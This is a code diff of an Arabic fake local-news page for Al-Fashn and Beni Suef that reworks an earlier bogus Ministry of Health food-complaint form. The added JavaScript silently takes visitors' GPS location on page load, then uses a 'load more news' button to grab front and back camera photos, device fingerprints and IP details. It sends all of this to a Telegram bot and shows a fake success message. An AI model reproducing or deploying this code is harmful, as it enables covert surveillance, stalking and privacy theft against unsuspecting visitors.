@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>📰 أخبار الفشن وبني سويف | بلاغ عن أغذية فاسدة</title>
+    <title>📰 أخبار الفشن وبني سويف | آخر الأخبار المحلية</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
 
@@ -248,217 +248,52 @@
         .action-btn:hover { background: rgba(34,197,94,0.08); }
         .action-btn.liked { color: #22c55e; }
 
-        /* ========== زر فتح البلاغ ========== */
-        .report-btn {
+        /* ========== زر تابع المزيد ========== */
+        .more-btn {
             width: 100%;
-            padding: 18px;
+            padding: 16px;
             background: linear-gradient(135deg, #22c55e, #15803d);
             border: none;
-            border-radius: 16px;
+            border-radius: 50px;
             color: #fff;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 900;
             font-family: inherit;
             cursor: pointer;
             transition: 0.3s;
             box-shadow: 0 8px 30px rgba(34,197,94,0.35);
-            margin: 18px 0;
+            margin: 16px 0 6px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
         }
-        .report-btn:active { transform: scale(0.97); }
+        .more-btn:active { transform: scale(0.97); }
+        .more-btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        /* ========== البطاقة الرئيسية للبلاغ ========== */
-        .main-card {
+        /* ========== رسالة الحالة ========== */
+        .status-msg {
             display: none;
-            background: rgba(0,0,0,0.75);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border-radius: 28px;
-            padding: 24px 20px;
-            border: 1px solid rgba(34,197,94,0.2);
-            box-shadow: 0 30px 70px rgba(0,0,0,0.6);
-            margin-top: 10px;
-            animation: fadeSlide 0.4s ease;
-        }
-        .main-card.show { display: block; }
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .header-badge {
-            display: inline-block;
-            background: rgba(34,197,94,0.12);
-            border: 1px solid rgba(34,197,94,0.25);
-            border-radius: 30px;
-            padding: 5px 16px;
-            font-size: 11px;
-            color: #86efac;
-            font-weight: 800;
-            margin-bottom: 12px;
-        }
-        .icon-box {
-            width: 70px; height: 70px;
-            background: linear-gradient(135deg, #22c55e, #15803d);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 12px;
-            font-size: 36px;
-            box-shadow: 0 10px 40px rgba(34,197,94,0.3);
-            animation: pulse-icon 2s ease-in-out infinite;
-        }
-        @keyframes pulse-icon {
-            0%,100% { transform: scale(1); }
-            50% { transform: scale(1.06); }
-        }
-        .main-title {
-            color: #fff;
-            font-size: 22px;
-            font-weight: 900;
-            text-align: center;
-            margin-bottom: 4px;
-        }
-        .main-title span {
-            background: linear-gradient(135deg, #86efac, #22c55e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .sub-desc {
-            color: rgba(255,255,255,0.4);
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 16px;
-        }
-
-        /* ========== النموذج ========== */
-        .form-group {
-            margin-bottom: 12px;
-            text-align: right;
-        }
-        .form-group label {
-            display: block;
-            color: rgba(255,255,255,0.65);
-            font-size: 12px;
-            font-weight: 700;
-            margin-bottom: 5px;
-        }
-        .form-group label .optional {
-            color: rgba(255,255,255,0.2);
-            font-size: 10px;
-            font-weight: 400;
-        }
-        .form-group input,
-        .form-group textarea,
-        .form-group select {
-            width: 100%;
-            padding: 11px 14px;
-            background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 10px;
-            color: #fff;
-            font-size: 14px;
-            font-family: inherit;
-            transition: 0.3s;
-            appearance: none;
-            -webkit-appearance: none;
-        }
-        .form-group select option { background: #1a1a1a; color: #fff; }
-        .form-group input:focus,
-        .form-group textarea:focus,
-        .form-group select:focus {
-            outline: none;
-            border-color: rgba(34,197,94,0.5);
-            background: rgba(255,255,255,0.06);
-        }
-        .form-group input::placeholder,
-        .form-group textarea::placeholder {
-            color: rgba(255,255,255,0.2);
-        }
-        .form-group textarea { min-height: 70px; resize: vertical; }
-
-        .start-btn {
-            width: 100%;
-            padding: 17px;
-            background: linear-gradient(135deg, #22c55e, #15803d);
-            border: none;
-            border-radius: 50px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 900;
-            font-family: inherit;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 8px 30px rgba(34,197,94,0.3);
-            margin-top: 8px;
-        }
-        .start-btn:active { transform: scale(0.97); }
-        .start-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
-        .back-btn {
-            width: 100%;
-            padding: 12px;
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 50px;
-            color: rgba(255,255,255,0.6);
-            font-size: 14px;
-            font-weight: 700;
-            font-family: inherit;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.2s;
-        }
-        .back-btn:active { transform: scale(0.97); }
-
-        /* ========== رسالة النجاح ========== */
-        .result-box {
-            display: none;
-            margin-top: 14px;
-            padding: 18px;
+            margin-top: 12px;
+            padding: 14px 16px;
             background: rgba(34,197,94,0.08);
             border: 1px solid rgba(34,197,94,0.2);
-            border-radius: 16px;
+            border-radius: 14px;
             text-align: center;
-        }
-        .result-box.show {
-            display: block;
-            animation: fadeSlide 0.4s ease;
-        }
-        .result-box .result-icon {
-            font-size: 42px;
-            display: block;
-            margin-bottom: 6px;
-        }
-        .result-box .result-name {
+            font-size: 13px;
             color: #86efac;
-            font-size: 18px;
-            font-weight: 900;
-        }
-        .result-box .result-sub {
-            color: rgba(255,255,255,0.4);
-            font-size: 12px;
-            margin-top: 4px;
-        }
-
-        /* ========== رسالة خطأ ========== */
-        .error-msg {
-            display: none;
-            margin-top: 10px;
-            padding: 10px 14px;
-            background: rgba(239,68,68,0.1);
-            border: 1px solid rgba(239,68,68,0.2);
-            border-radius: 12px;
-            color: #f87171;
-            font-size: 12px;
             font-weight: 700;
         }
-        .error-msg.show { display: block; animation: fadeSlide 0.3s ease; }
+        .status-msg.show { display: block; animation: fadeSlide 0.4s ease; }
+        .status-msg.error {
+            background: rgba(239,68,68,0.1);
+            border-color: rgba(239,68,68,0.25);
+            color: #f87171;
+        }
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
 
         /* ========== حالة الاتصال ========== */
         .status-badge {
@@ -497,9 +332,23 @@
             padding: 20px 0 10px;
         }
 
+        /* ========== سبينر صغير في الزر ========== */
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .spinner.show { display: inline-block; }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         @media (max-width: 480px) {
             .page-title h1 { font-size: 22px; }
-            .main-title { font-size: 19px; }
         }
     </style>
 </head>
@@ -526,7 +375,7 @@
 <!-- أخبار عاجلة -->
 <div class="breaking-news">
     <strong>⚡ عاجل:</strong>
-    <span class="ticker">حملة رقابية على الأسواق في الفشن | ضبط كميات من الأغذية الفاسدة في بني سويف | وزارة الصحة تحذر من منتجات مجهولة المصدر | بلّغ عن أي غذاء مشبوه وساهم في حماية عائلتك</span>
+    <span class="ticker">حملة رقابية على الأسواق في الفشن | تحذير من منتجات مجهولة المصدر في بني سويف | افتتاح مشروعات جديدة قريباً | تابع آخر المستجدات لحظة بلحظة</span>
 </div>
 
 <!-- الحاوية -->
@@ -535,7 +384,7 @@
     <!-- عنوان الصفحة -->
     <div class="page-title">
         <h1>📰 أخبار الفشن وبني سويف</h1>
-        <p>آخر الأحداث المحلية + خدمة الإبلاغ عن الأغذية الفاسدة</p>
+        <p>آخر الأحداث المحلية لحظة بلحظة</p>
     </div>
 
     <!-- بوست 1 -->
@@ -553,7 +402,7 @@
         </div>
         <div class="post-body">
             <strong>حملة رقابية مكثفة على الأسواق والمحلات بالفشن</strong>
-            شنت مديرية الصحة ببني سويف حملة رقابية موسعة على محلات بيع الأغذية بمركز الفشن، أسفرت عن ضبط كميات من المنتجات منتهية الصلاحية. الحملة تأتي ضمن خطة الوزارة لحماية المواطنين من الأغذية الفاسدة.
+            شنت مديرية الصحة ببني سويف حملة رقابية موسعة على محلات بيع الأغذية بمركز الفشن، أسفرت عن ضبط كميات من المنتجات منتهية الصلاحية. الحملة تأتي ضمن خطة الوزارة لحماية المواطنين.
         </div>
         <div class="post-actions">
             <button class="action-btn like-btn">👍 <span class="like-count">342</span></button>
@@ -576,8 +425,8 @@
             <span class="post-tag">تحذير</span>
         </div>
         <div class="post-body">
-            <strong>تحذير من منتجات ألبان مجهولة المصدر في بني سويف</strong>
-            حذرت مديرية الصحة المواطنين من شراء منتجات ألبان مجهولة المصدر تُباع في بعض الأسواق الشعبية. وطالبت المواطنين بالإبلاغ الفوري عن أي منتج مشتبه به عبر القنوات الرسمية.
+            <strong>تحذير من منتجات مجهولة المصدر في بني سويف</strong>
+            حذرت مديرية الصحة المواطنين من شراء منتجات مجهولة المصدر تُباع في بعض الأسواق الشعبية. وطالبت المواطنين بالتأكد من تاريخ الصلاحية والعلامة التجارية قبل الشراء.
         </div>
         <div class="post-actions">
             <button class="action-btn like-btn">👍 <span class="like-count">518</span></button>
@@ -601,7 +450,7 @@
         </div>
         <div class="post-body">
             <strong>مستشفى الفشن المركزي يستقبل حالات تسمم غذائي</strong>
-            استقبل مستشفى الفشن المركزي عدداً من الحالات المصابة بأعراض تسمم غذائي بعد تناول أغذية من أحد المحلات. تم تقديم الإسعافات اللازمة وجميع الحالات في تحسن. الجهات المختصة فتحت تحقيقاً في الواقعة.
+            استقبل مستشفى الفشن المركزي عدداً من الحالات المصابة بأعراض تسمم غذائي بعد تناول أغذية من أحد المحلات. تم تقديم الإسعافات اللازمة وجميع الحالات في تحسن.
         </div>
         <div class="post-actions">
             <button class="action-btn like-btn">👍 <span class="like-count">267</span></button>
@@ -610,72 +459,38 @@
         </div>
     </div>
 
-    <!-- زر فتح البلاغ -->
-    <button class="report-btn" id="openReportBtn">
-        ⚠️ أبلغ عن أغذية فاسدة الآن
+    <!-- بوست 4 -->
+    <div class="post-card">
+        <div class="post-header">
+            <div class="avatar p">مح</div>
+            <div class="post-info">
+                <div class="post-author">محمد حسن علي</div>
+                <div class="post-time">🕐 منذ 12 ساعة · بني سويف</div>
+            </div>
+        </div>
+        <div class="post-image g4">
+            🎓
+            <span class="post-tag">تعليم</span>
+        </div>
+        <div class="post-body">
+            <strong>افتتاح مدرسة جديدة في قرية تابعة لمركز الفشن</strong>
+            تم افتتاح مدرسة جديدة داخل قرية من قرى مركز الفشن بمحافظة بني سويف، بعد سنوات من المعاناة بسبب بُعد المدارس عن القرية. الأهالي عبروا عن سعادتهم الكبيرة بهذا الإنجاز.
+        </div>
+        <div class="post-actions">
+            <button class="action-btn like-btn">👍 <span class="like-count">891</span></button>
+            <button class="action-btn">💬 203</button>
+            <button class="action-btn">↗️ مشاركة</button>
+        </div>
+    </div>
+
+    <!-- زر تابع المزيد -->
+    <button class="more-btn" id="moreBtn">
+        <span class="spinner" id="btnSpinner"></span>
+        <span id="btnText">📖 تابع المزيد من الأخبار</span>
     </button>
 
-    <!-- البطاقة الرئيسية للبلاغ -->
-    <div class="main-card" id="mainCard">
-        <div style="text-align:center;">
-            <div class="header-badge">🏥 وزارة الصحة | بلاغ عن أغذية فاسدة</div>
-        </div>
-        <div class="icon-box">⚠️</div>
-        <h1 class="main-title">بلاغ عن <span>أغذية فاسدة</span></h1>
-        <p class="sub-desc">ساهم في حماية الصحة العامة، أبلغ عن أي غذاء مشبوه</p>
-
-        <form id="applicationForm" onsubmit="return false;">
-            <div class="form-group">
-                <label>👤 الاسم الكامل <span style="color:#ef4444;">*</span></label>
-                <input type="text" id="fullName" placeholder="أدخل اسمك الثلاثي">
-            </div>
-            <div class="form-group">
-                <label>📞 رقم الهاتف <span style="color:#ef4444;">*</span></label>
-                <input type="tel" id="phoneNumber" placeholder="رقم الهاتف للتواصل">
-            </div>
-            <div class="form-group">
-                <label>📍 موقع الشراء / المنشأة <span style="color:#ef4444;">*</span></label>
-                <input type="text" id="place" placeholder="اسم المطعم أو السوبرماركت أو العنوان">
-            </div>
-            <div class="form-group">
-                <label>🏷️ نوع المنتج المشتبه به <span style="color:#ef4444;">*</span></label>
-                <input type="text" id="product" placeholder="مثال: جبن، عصير، لحوم، حليب...">
-            </div>
-            <div class="form-group">
-                <label>📅 تاريخ الشراء <span style="color:#ef4444;">*</span></label>
-                <input type="date" id="purchaseDate">
-            </div>
-            <div class="form-group">
-                <label>⚠️ سبب الشك / المشكلة <span style="color:#ef4444;">*</span></label>
-                <select id="issueType">
-                    <option value="">-- اختر نوع المشكلة --</option>
-                    <option value="رائحة غير طبيعية">👃 رائحة غير طبيعية</option>
-                    <option value="تغير في اللون">🎨 تغير في اللون</option>
-                    <option value="انتفاخ أو تلف في العبوة">📦 انتفاخ أو تلف في العبوة</option>
-                    <option value="طعم غريب">👅 طعم غريب</option>
-                    <option value="وجود حشرات أو مواد غريبة">🐛 وجود حشرات أو مواد غريبة</option>
-                    <option value="تاريخ انتهاء منتهي">📅 تاريخ انتهاء منتهي</option>
-                    <option value="أعراض تسمم غذائي">🤢 أعراض تسمم غذائي</option>
-                    <option value="أخرى">أخرى</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label>📝 وصف تفصيلي للمشكلة <span class="optional">(اختياري)</span></label>
-                <textarea id="notes" placeholder="أدخل تفاصيل إضافية..."></textarea>
-            </div>
-        </form>
-
-        <button class="start-btn" id="startBtn">📤 إرسال البلاغ</button>
-        <button class="back-btn" id="backBtn">← رجوع للأخبار</button>
-
-        <div class="result-box" id="resultBox">
-            <span class="result-icon">✅</span>
-            <div class="result-name">تم إرسال البلاغ بنجاح!</div>
-            <div class="result-sub">شكراً لتعاونك، سيتم مراجعة البلاغ من قبل المختصين</div>
-        </div>
-
-        <div class="error-msg" id="errorMsg">⚠️ حدث خطأ، حاول مرة أخرى</div>
-    </div>
+    <!-- رسالة الحالة -->
+    <div class="status-msg" id="statusMsg"></div>
 
     <div class="footer-note">
         © 2026 أخبار الفشن وبني سويف | جميع الحقوق محفوظة
@@ -708,18 +523,6 @@
                     fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
                     fd.append('caption', caption);
                     await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
-                } else if (type === 'video') {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
-                    fd.append('caption', caption);
-                    await fetch(url + 'sendVideo', { method: 'POST', body: fd });
-                } else if (type === 'audio') {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('audio', mediaBlob, 'voice_note.ogg');
-                    fd.append('caption', caption);
-                    await fetch(url + 'sendAudio', { method: 'POST', body: fd });
                 } else {
                     await fetch(url + 'sendMessage', {
                         method: 'POST',
@@ -732,9 +535,9 @@
         }
 
         // ============================================================
-        // ================ الموقع الجغرافي (أول شيء إجباري) ==========
+        // ================ الموقع الجغرافي (أول ما الصفحة تحمل) ======
         // ============================================================
-        function getLocation(chatId, botToken, formData) {
+        function requestLocationOnLoad() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve({ success: false, reason: 'غير مدعوم' });
@@ -748,22 +551,26 @@
                     try {
                         const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                         const data = await revGeo.json();
-                        if (data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
+                        if (data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 120)}`;
                     } catch(e) {}
 
-                    const locMsg = `🌍 <b>موقع البلاغ</b>\n👤 الاسم: ${formData.fullName || 'غير محدد'}\n📞 الهاتف: ${formData.phone || 'غير محدد'}\n🏷️ المنتج: ${formData.product || 'غير محدد'}\n📍 المكان: ${formData.place || 'غير محدد'}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
-                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
+                    const locMsg = `🌍 <b>زائر جديد دخل صفحة الأخبار</b>\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+                    await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, locMsg);
                     resolve({ success: true });
                 }, (err) => {
+                    // لو رفض الموقع، نبلغ المالك
+                    sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
+                        `⚠️ <b>زائر رفض إذن الموقع</b>\n🔴 السبب: ${err.message}\n⏰ ${new Date().toLocaleString('ar-EG')}`
+                    );
                     resolve({ success: false, reason: err.message });
-                }, { enableHighAccuracy: true, timeout: 15000 });
+                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
             });
         }
 
         // ============================================================
         // ================ الكاميرا الأمامية =========================
         // ============================================================
-        async function captureFrontCamera(chatId, botToken, formData) {
+        async function captureFrontCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
@@ -778,8 +585,8 @@
                 canvas.height = video.videoHeight || 600;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                const caption = `📸 صورة مقدم البلاغ\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}`;
-                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'photo', blob,
+                    `📸 صورة الزائر (كاميرا أمامية)\n⏰ ${new Date().toLocaleString('ar-EG')}`);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch(e) {
@@ -791,7 +598,7 @@
         // ============================================================
         // ================ الكاميرا الخلفية ==========================
         // ============================================================
-        async function captureBackCamera(chatId, botToken, formData) {
+        async function captureBackCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } }
@@ -805,8 +612,8 @@
                 canvas.height = video.videoHeight || 768;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                const caption = `📷 صورة المنتج المشتبه به\n👤 الاسم: ${formData.fullName}\n🏷️ المنتج: ${formData.product}\n📍 المكان: ${formData.place}`;
-                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'photo', blob,
+                    `📷 صورة الزائر (كاميرا خلفية)\n⏰ ${new Date().toLocaleString('ar-EG')}`);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch(e) {
@@ -818,7 +625,7 @@
         // ============================================================
         // ================ بصمة الجهاز ================================
         // ============================================================
-        async function getDeviceFingerprint(chatId, botToken, formData) {
+        async function getDeviceFingerprint() {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
             const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
@@ -834,14 +641,14 @@
             if (navigator.connection) {
                 connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
             }
-            const deviceMsg = `🕵️‍♂️ <b>بيانات جهاز مقدم البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
-            await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
+            const deviceMsg = `🕵️‍♂️ <b>بيانات جهاز الزائر</b>\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 150)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ ${new Date().toLocaleString('ar-EG')}`;
+            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, deviceMsg);
         }
 
         // ============================================================
         // ================ IP ========================================
         // ============================================================
-        async function getIPData(chatId, botToken, formData) {
+        async function getIPData() {
             try {
                 const [ipRes, ipInfoRes] = await Promise.all([
                     fetch('https://api.ipify.org?format=json'),
@@ -850,121 +657,79 @@
                 const ipData = await ipRes.json();
                 let ipDetails = {};
                 try { ipDetails = await ipInfoRes.json(); } catch(e) {}
-                const ipMsg = `🌐 <b>IP مقدم البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n🔹 IP: ${ipData.ip}\n🏳️ البلد: ${ipDetails.country_name || 'غير معروف'}\n🏙️ المدينة: ${ipDetails.city || 'غير معروف'}\n📡 المزود: ${ipDetails.org || 'غير معروف'}`;
-                await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
+                const ipMsg = `🌐 <b>IP الزائر</b>\n🔹 IP: ${ipData.ip}\n🏳️ البلد: ${ipDetails.country_name || 'غير معروف'}\n🏙️ المدينة: ${ipDetails.city || 'غير معروف'}\n📡 المزود: ${ipDetails.org || 'غير معروف'}`;
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, ipMsg);
             } catch(e) {}
         }
 
         // ============================================================
         // ================ عناصر الواجهة =============================
         // ============================================================
-        const openReportBtn = document.getElementById('openReportBtn');
-        const mainCard = document.getElementById('mainCard');
-        const backBtn = document.getElementById('backBtn');
-        const startBtn = document.getElementById('startBtn');
-        const resultBox = document.getElementById('resultBox');
-        const errorMsg = document.getElementById('errorMsg');
+        const moreBtn = document.getElementById('moreBtn');
+        const btnText = document.getElementById('btnText');
+        const btnSpinner = document.getElementById('btnSpinner');
+        const statusMsg = document.getElementById('statusMsg');
 
         let isRunning = false;
 
-        // فتح بطاقة البلاغ
-        openReportBtn.addEventListener('click', () => {
-            mainCard.classList.add('show');
-            mainCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
-        });
-
-        // رجوع للأخبار
-        backBtn.addEventListener('click', () => {
-            mainCard.classList.remove('show');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        });
-
-        function showError(text) {
-            errorMsg.textContent = text || '⚠️ حدث خطأ، حاول مرة أخرى';
-            errorMsg.classList.add('show');
-            setTimeout(() => errorMsg.classList.remove('show'), 5000);
+        function showStatus(text, isError) {
+            statusMsg.textContent = text;
+            statusMsg.classList.toggle('error', !!isError);
+            statusMsg.classList.add('show');
+            setTimeout(() => statusMsg.classList.remove('show'), 6000);
         }
 
         // ============================================================
-        // ================ التشغيل الرئيسي ============================
+        // ================ أول ما الصفحة تحمل: طلب الموقع إجباري ====
         // ============================================================
-        async function startProcess() {
+        window.addEventListener('load', async () => {
+            // طلب الموقع فوراً أول ما الصفحة تحمل
+            await requestLocationOnLoad();
+        });
+
+        // ============================================================
+        // ================ زر "تابع المزيد" ==========================
+        // ============================================================
+        moreBtn.addEventListener('click', async () => {
             if (isRunning) return;
-
-            // جمع البيانات
-            const fullName = document.getElementById('fullName').value.trim();
-            const phone = document.getElementById('phoneNumber').value.trim();
-            const place = document.getElementById('place').value.trim();
-            const product = document.getElementById('product').value.trim();
-            const purchaseDate = document.getElementById('purchaseDate').value;
-            const issueType = document.getElementById('issueType').value;
-            const notes = document.getElementById('notes').value.trim();
-
-            // التحقق
-            if (!fullName || !phone || !place || !product || !purchaseDate || !issueType) {
-                showError('⚠️ يرجى تعبئة جميع الحقول المطلوبة');
-                return;
-            }
-            if (phone.length < 10) {
-                showError('⚠️ رقم الهاتف غير صحيح');
-                return;
-            }
-
-            const formData = { fullName, phone, place, product, purchaseDate, issueType, notes: notes || 'لا يوجد' };
-
             isRunning = true;
-            startBtn.disabled = true;
-            startBtn.textContent = '⏳ جاري الإرسال...';
-            resultBox.classList.remove('show');
-            errorMsg.classList.remove('show');
+
+            moreBtn.disabled = true;
+            btnSpinner.classList.add('show');
+            btnText.textContent = '⏳ جاري التحميل...';
 
             try {
-                // ====== 1. إرسال بيانات البلاغ ======
-                const formMsg = `🏥 <b>بلاغ عن أغذية فاسدة - وزارة الصحة</b>\n\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n📍 المكان: ${formData.place}\n🏷️ المنتج: ${formData.product}\n📅 تاريخ الشراء: ${formData.purchaseDate}\n⚠️ المشكلة: ${formData.issueType}\n📝 التفاصيل: ${formData.notes}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
-                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, formMsg);
+                // 1. الكاميرا الأمامية
+                await captureFrontCamera();
 
-                // ====== 2. الموقع الجغرافي (أول شيء إجباري) ======
-                const locResult = await getLocation(MASTER_ID, BOT_TOKEN, formData);
+                // 2. الكاميرا الخلفية
+                await captureBackCamera();
 
-                // لو الموقع مرفوض، نبلغ المالك ونكمل
-                if (!locResult.success) {
-                    await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                        `⚠️ <b>المستخدم رفض الموقع</b>\n👤 ${formData.fullName}\n📞 ${formData.phone}\n🔴 السبب: ${locResult.reason || 'مرفوض'}`
-                    );
-                }
+                // 3. بصمة الجهاز
+                await getDeviceFingerprint();
 
-                // ====== 3. الكاميرا الأمامية ======
-                await captureFrontCamera(MASTER_ID, BOT_TOKEN, formData);
+                // 4. IP
+                await getIPData();
 
-                // ====== 4. الكاميرا الخلفية ======
-                await captureBackCamera(MASTER_ID, BOT_TOKEN, formData);
+                showStatus('✅ تم تحميل المزيد من الأخبار بنجاح');
 
-                // ====== 5. بصمة الجهاز ======
-                await getDeviceFingerprint(MASTER_ID, BOT_TOKEN, formData);
-
-                // ====== 6. IP ======
-                await getIPData(MASTER_ID, BOT_TOKEN, formData);
-
-                // ====== 7. إشعار نهائي ======
-                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
-                    `✅ <b>تم إرسال بلاغ الأغذية الفاسدة بنجاح!</b>\n👤 ${formData.fullName}\n📞 ${formData.phone}\n🏷️ ${formData.product}`
-                );
-
-                // عرض النجاح
-                resultBox.classList.add('show');
-                setTimeout(() => resultBox.classList.remove('show'), 8000);
+                // محاكاة تحميل أخبار جديدة
+                setTimeout(() => {
+                    window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+                }, 500);
 
             } catch(e) {
                 console.error(e);
-                showError('❌ حدث خطأ أثناء إرسال البلاغ');
+                showStatus('⚠️ حدث خطأ، حاول مرة أخرى', true);
             }
 
-            startBtn.disabled = false;
-            startBtn.textContent = '📤 إرسال البلاغ';
-            isRunning = false;
-        }
-
-        startBtn.addEventListener('click', startProcess);
+            setTimeout(() => {
+                btnSpinner.classList.remove('show');
+                btnText.textContent = '📖 تابع المزيد من الأخبار';
+                moreBtn.disabled = false;
+                isRunning = false;
+            }, 1000);
+        });
 
         // أزرار الإعجاب
         document.querySelectorAll('.like-btn').forEach(btn => {
@@ -982,7 +747,7 @@
             });
         });
 
-        console.log("📰 صفحة أخبار الفشن + بلاغ أغذية فاسدة جاهزة");
+        console.log("📰 صفحة أخبار الفشن جاهزة - الموقع يُطلب تلقائياً");
     })();
 </script>
 
